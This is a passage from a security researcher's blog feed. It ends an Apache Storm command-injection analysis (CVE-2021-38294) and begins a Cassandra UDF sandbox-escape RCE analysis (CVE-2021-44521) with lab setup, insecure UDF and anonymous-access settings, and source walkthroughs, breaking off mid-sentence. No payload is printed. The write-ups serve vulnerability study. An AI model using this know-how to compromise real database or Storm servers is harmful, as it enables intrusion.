&lt;p&gt;Finally, Here we can see it started to connect to the configured &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;client&lt;/code&gt; and call the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sendSupervisorWorkerHeartbeats()&lt;/code&gt; method which can be called remotely. Now, if we go to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apache-storm-2.2.0/storm-server/src/main/java/org/apache/storm/daemon/nimbus/Nimbus.java&lt;/code&gt; Class:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/963748ef6f8dff1184bb1fadcb2f0bb3&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we can see the method clearly accessible remotely and also if we search for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getTopologyHistory()&lt;/code&gt; method:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/f2d166d2cedf722f2c37065a72993abc&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we can see the method clearly and it takes the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; as an parameter to retrieve the topology history information for a the user. And here where the command get injected, When we back to the first of the analysis at the patch diffing when we return information about user, As the user here can be passed and manupilated by anyone through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getTopologyHistory()&lt;/code&gt; method. It will result in malicious command Injection.&lt;/p&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Here we have 2 ways to exploit &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2021-38294&lt;/code&gt; an exploit within &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Metasploit&lt;/code&gt; with metasploit as it’s easy to use and most of us fimalier with it By using the following module:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/ecd3642b788a836d78d2583718a78d51&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and the 2nd one is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PoC&lt;/code&gt; within &lt;a href=&quot;https://securitylab.github.com/advisories/GHSL-2021-085-apache-storm/&quot;&gt;github&lt;/a&gt;.&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Finally, This bug only works on linux as the injectable of the affected component is when getting the information about the user on linux. We saw how this vulnerability happens and the root-cause of the vulnerability &amp;amp; How it can be exploited remotely.&lt;/p&gt;

&lt;h1 id=&quot;resources&quot;&gt;&lt;strong&gt;Resources&lt;/strong&gt;&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;https://www.cloudduggu.com/storm/installation/&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://archive.apache.org/dist/zookeeper/zookeeper-3.7.0/apache-zookeeper-3.7.0-bin.tar.gz&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://archive.apache.org/dist/storm/apache-storm-2.2.0/apache-storm-2.2.0.zip&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;#apache #storm #cve #analysis&lt;/p&gt;</content><author><name>Zeyad Azima</name></author><summary type="html">Introduction</summary></entry><entry><title type="html">CVE-2021-44521: Apache Cassandra Remote Code Execution</title><link href="http://localhost:5000/security%20research/CVE_2021_44521/" rel="alternate" type="text/html" title="CVE-2021-44521: Apache Cassandra Remote Code Execution" /><published>2023-05-28T00:00:00+08:00</published><updated>2023-05-28T00:00:00+08:00</updated><id>http://localhost:5000/security%20research/CVE_2021_44521</id><content type="html" xml:base="http://localhost:5000/security%20research/CVE_2021_44521/">&lt;h1 id=&quot;introduction&quot;&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2021-44521&lt;/code&gt; is a vulnerability discovered in Apache Cassandra which allow an attacker to achieve remote command execution through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDFS&lt;/code&gt; &amp;amp; bypass the sandbox to execute the code on the server under specific configurations which let the attacker to takeover the server.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;CVSS&lt;/strong&gt;:(Critical) https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?name=CVE-2021-44521&amp;amp;vector=AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H&amp;amp;version=3.1&amp;amp;source=NIST&lt;/p&gt;

&lt;h1 id=&quot;what-is-apache-cassandra-&quot;&gt;&lt;strong&gt;What is Apache Cassandra ?&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Apache Cassandra is an open-source distributed NoSQL database management system, Cassandra is highly scalable and can handle large amounts of structured, semi-structured, and unstructured data across multiple data centers, making it a popular choice for big data applications. It uses a decentralized architecture, with no master node, which allows for linear scalability and fault tolerance. Also, It’s highly tunable and configurable, allowing developers to adjust the system to their specific use case and workload.&lt;/p&gt;

&lt;h2 id=&quot;cql&quot;&gt;&lt;strong&gt;CQL&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CQL&lt;/code&gt; is a short for Cassandra Query Language, Which is a query language similar to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQL&lt;/code&gt;, but optimized for distributed database environments with support for secondary indexes, materialized views, and batch operations, among other features.&lt;/p&gt;

&lt;h2 id=&quot;udfs&quot;&gt;&lt;strong&gt;UDFs&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDFs&lt;/code&gt; is a short for User-Defined Functions which are functions that can be created and executed by users within a database management system. In our case, Cassandra offers the functionality of creating user-defined-functions (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDFs&lt;/code&gt;) &amp;amp; the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDFs&lt;/code&gt; in Cassandra can be written by default in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Java&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JavaScript&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;nashorn&quot;&gt;&lt;strong&gt;Nashorn&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Nashorn&lt;/code&gt; is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JavaScript&lt;/code&gt; engine that was introduced in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Java 8&lt;/code&gt; and it allows users to execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JavaScript&lt;/code&gt; code within a sanbox &amp;amp; It can be used to create and execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JavaScript&lt;/code&gt; based &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDFs&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Java&lt;/code&gt; based database management systems by executing it inside of a sandbox.&lt;/p&gt;

&lt;h1 id=&quot;testing-lab&quot;&gt;&lt;strong&gt;Testing Lab&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Now, Let’s setup our testing lab for analysis &amp;amp; We gonna be using Cassandra &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4.0.0&lt;/code&gt;, But we need to do some modification for the configuration file within the container and create a new image from it then start a container based on our modified one. First we will pull the Cassandra image:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker pull cassandra:4.0.0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4e48f7fb0bcb7601b3d50ae95856f241&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now let’s run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cassandra&lt;/code&gt; container:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo docker run --name my-cassandra-analysis -d cassandra:4.0.0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/279caa6bf30e49c92663a8a04213b697&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s check if the container is running:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo docker ps -a
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/78422d0d49f36ee79c5e874b19a563d3&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see the container is running, Now, Let’s open a shell to it and start our modifications:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo docker exec -it CONTAINER_ID bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/c0544de11f6a01b245f0b7e19f7cd071&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, Under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/cassandar&lt;/code&gt; we can find the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cassandra.yaml&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/fb99be5ad770e4ecaca227408490cb3c&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s open &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cassandra.yaml&lt;/code&gt; and modifiy &amp;amp; add the following lines:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;enable_user_defined_functions: true
enable_scripted_user_defined_functions: true
enable_user_defined_functions_threads: false
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After this save the file and exit the shell. And the time for creating image from our container is came:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo docker commit my-cassandra-4.0.0 cassandra-analysis:latest 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/8c55a768fbfde7a5c8f91b2a58e9284a&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, Everything is ready let’s stop the continer and run a new one using our modified image:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo docker run --name my-cassandra-analysis -e &quot;JAVA_TOOL_OPTIONS=-agentlib:jdwp=transport=dt_socket,address=8000,server=y,suspend=n&quot; -p 8000:8000 -d cassandra-analysis:latest
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/1949302dab0ed264b527c58bcc225a28&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-e JAVA_TOOL_OPTIONS=&quot;-agentlib:jdwp=transport=dt_socket,address=8000,server=y,suspend=n&quot;&lt;/code&gt; is to set a debugging port, So we can perform our dynamic analysis later and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p 8000:8000&lt;/code&gt; to map the external connections of port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8000&lt;/code&gt; into the container. Now, If we execute shell on the container &amp;amp; try to see the configuration file of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cassandra.yaml&lt;/code&gt; we can see our modified configurations applied:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/193792029a8eaa358e5572128076b53c&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;static-analysis&quot;&gt;&lt;strong&gt;Static Analysis&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;If we go again to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cassandra.yaml&lt;/code&gt; file we can be able to see that the anonymous access is allowed as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;authenticator&lt;/code&gt; config is set as the following:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;authenticator: AllowAllAuthenticator
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And if we go to the cassandra source code we can find a call called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AllowAllAuthenticator&lt;/code&gt; under the following path &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/src/java/org/apache/cassandra/auth&lt;/code&gt;, Let’s take a look and check it out:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public class AllowAllAuthenticator implements IAuthenticator
{
    private static final SaslNegotiator AUTHENTICATOR_INSTANCE = new Negotiator();

    public boolean requireAuthentication()
    {
        return false;
    }

    public Set&amp;lt;IResource&amp;gt; protectedResources()
    {
        return Collections.emptySet();
    }

    public void validateConfiguration() throws ConfigurationException
    {
    }

    public void setup()
    {
    }

    public SaslNegotiator newSaslNegotiator(InetAddress clientAddress)
    {
        return AUTHENTICATOR_INSTANCE;
    }

    public AuthenticatedUser legacyAuthenticate(Map&amp;lt;String, String&amp;gt; credentialsData)
    {
        return AuthenticatedUser.ANONYMOUS_USER;
    }

    private static class Negotiator implements SaslNegotiator
    {

        public byte[] evaluateResponse(byte[] clientResponse) throws AuthenticationException
        {
            return null;
        }

        public boolean isComplete()
        {
            return true;
        }

        public AuthenticatedUser getAuthenticatedUser() throws AuthenticationException
        {
            return AuthenticatedUser.ANONYMOUS_USER;
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The class implements the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IAuthenticator&lt;/code&gt; interface which is responsible for authenticating clients connecting to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cassandra&lt;/code&gt;, the class providing a simple authentication mechanism that allows all connections without need for any credentials, In short words, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Anonymous&lt;/code&gt; authentication.Let’s see the intreasted functions as steps happen as the following The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;requireAuthentication()&lt;/code&gt; function indicates whether authentication is required or no. In this case, it returns false which means authentication is not required. Then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;protectedResources()&lt;/code&gt; method returns a set of protected resources &amp;amp; since there is no authentication it returns an empty set. After that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;legacyAuthenticate()&lt;/code&gt; function is used for legacy authentication and It accepts credentials data and returns an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AuthenticatedUser&lt;/code&gt; instance. In this case, it always returns the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ANONYMOUS_USER&lt;/code&gt; from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AuthenticatedUser&lt;/code&gt; class. Now, If we try to access &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cassandra&lt;/code&gt; we will be able to see that we logged-in without any asking for credentials:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3858629ccfcedc7cf5e093e1c6be25dc&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Here we can see we are on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cassandra&lt;/code&gt; without any asking for credentials. Now, Back to our configurationsm Let’s explain each option in the configurations we apply to understand it more clearly.&lt;/p&gt;

&lt;h3 id=&quot;enable_user_defined_functions--enable_scripted_user_defined_functions&quot;&gt;enable_user_defined_functions &amp;amp; enable_scripted_user_defined_functions&lt;/h3&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enable_user_defined_functions&lt;/code&gt; &amp;amp; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enable_scripted_user_defined_functions&lt;/code&gt; options are for enabling the support of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDFs&lt;/code&gt; in both &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Java&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Javascript&lt;/code&gt;. Now, If we go to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;src/java/org/apache/cassandra/cql3/functions/UDFunction.java&lt;/code&gt; and take a look on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDFs&lt;/code&gt; get implementaion. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDFunction&lt;/code&gt; class provides methods for validating the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDFs&lt;/code&gt; configuration and parameters and ensure that the function definition is correct and compatible with the expected data types.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/9708f73eaa11b3c08e743d9bb1a8e846&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Here first we can see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDFunction&lt;/code&gt; class is declared as abstract and extends the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AbstractFunction&lt;/code&gt; class &amp;amp; implements the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ScalarFunction&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SchemaElement&lt;/code&gt; interfaces. Them, defines a variable called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;logger&lt;/code&gt; from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LoggerFactory&lt;/code&gt; to log messages, After that a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;threadMXBean&lt;/code&gt; variable that provides access to the thread management and monitoring &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MXBean&lt;/code&gt;. Finally, Declaring the follwoing variables:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argNames&lt;/code&gt;: A list of ColumnIdentifier objects representing the names of the function arguments.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;language&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;body&lt;/code&gt;: Strings representing the language and body of the user-defined function.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argCodecs&lt;/code&gt;: An array of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TypeCodec&lt;/code&gt; Object representing the argument codecs for the function.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;returnCodec&lt;/code&gt;: A &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TypeCodec&lt;/code&gt; Object representing the return codec for the function.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;calledOnNullInput&lt;/code&gt;: A boolean indicating whether the function is called on null input.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;udfContext&lt;/code&gt;: A variable of type &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDFContext&lt;/code&gt; which provides context information for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDF&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2548bf65b8b4b70373b9d3564aa426f0&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By scrolling more down we can find here a variable named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allowedPatterns&lt;/code&gt; which is an array used for controlling access to classes and resources during compilation and runtime by compering to these patterns that specify the allowed classes/resources that can be loaded by the class loader. Moving to the following lines:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/284989788656563947404a49b206906f&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;Here we can see a variable named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disallowedPatterns&lt;/code&gt; which is an array used for the opposite process of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allowedPatterns&lt;/code&gt;, Which here the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disallowedPatterns&lt;/code&gt; used for controlling access to classes and resources during compilation and runtime by compering to these patterns that specify the disallowed classes/resources that can’t be loaded by the class loader.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/fc7261fecefb84ec6c258103720be7e4&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;In the next lines we can see the following clearly, This is a static function named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secureResource&lt;/code&gt; &amp;amp; basically, it’s used to determine whether a given resource is considered secure based on the allowed and disallowed patterns specified in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allowedPatterns&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disallowedPatterns&lt;/code&gt; arrays. First, the function takes a parameter named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resource&lt;/code&gt; and as we can guess it will be the required resources to be loaded, After that defines a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;While&lt;/code&gt; loop to remove forward slashes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; from the resource string by repeatedly calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;substring(1)&lt;/code&gt; until the forward slashes are eliminated, Then a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;for-each&lt;/code&gt; loop happens to iterate through the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allowedPatterns&lt;/code&gt; array to check if the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resource&lt;/code&gt; starts with any of the allowed patterns and If the resource starts with an allowed pattern it will proceed to check if it is explicitly disallowed by iterating through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;disallowedPatterns&lt;/code&gt; array to make sure there is no manipulation in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resource&lt;/code&gt; is being used for a bypass. Finally, If the the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resource&lt;/code&gt; patterns is disallowed it will return &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;false&lt;/code&gt; with a massage indicating access denial for the resource, If not, then it will return &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt; indicating that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resource&lt;/code&gt; is considered secure.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2a8983585a56e16eaef81acbc93402d3&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt; &lt;/p&gt;

&lt;p&gt;In the above lines in the screenshot, It’s creating a new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ClassLoader&lt;/code&gt; Object named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;udfClassLoader&lt;/code&gt; and initializes it with a new instance of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDFClassLoader&lt;/code&gt; class, After that it invokes a constructor named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDFunction&lt;/code&gt; which create and initialize a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDF&lt;/code&gt;, The function takes the following parameters:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name&lt;/code&gt;: A &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FunctionName&lt;/code&gt; object representing the name of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDF&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argNames&lt;/code&gt;: A list of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ColumnIdentifier&lt;/code&gt; objects representing the names of the function arguments.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argTypes&lt;/code&gt;: A list of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AbstractType&lt;/code&gt; objects representing the types of the function arguments.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;returnType&lt;/code&gt;: An &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AbstractType&lt;/code&gt; object representing the return type of the function.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;alledOnNullInput&lt;/code&gt;: A boolean indicating whether the function is called on null input.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;language&lt;/code&gt;: A string representing the language of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDF&lt;/code&gt;, Wethier is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Java&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JavaScritp&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;body&lt;/code&gt;: A string representing the body of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDF&lt;/code&gt;.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Then, it passes the provided parameters to the other constructor and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDHelper.driverType&lt;/code&gt; method is called with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;returnType&lt;/code&gt; parameter to convert the return type into the corresponding driver type using another helper method.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/fbee556e290b240a17e0921a2cffc5a7&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the next lines, Here we can see it invokes a second constructor with the same parameters. After that it invokes the constructor of the superclass &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AbstractFunction&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argTypes&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;returnType&lt;/code&gt; parameters, Then performs an assertion check to ensure that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argNames&lt;/code&gt; list does not contain any duplicate entries. After That, assigning the variables to instance variables of the class. Finally, It retrieves the metadata for the keyspace specified in the name parameter using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getKeyspaceMetadata&lt;/code&gt; method of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Schema.instance&lt;/code&gt; object and creates a new instance of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDFContextImpl&lt;/code&gt; class &amp;amp; pass the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;argNames&lt;/code&gt;, &lt;code class=&quot;language-plaintext 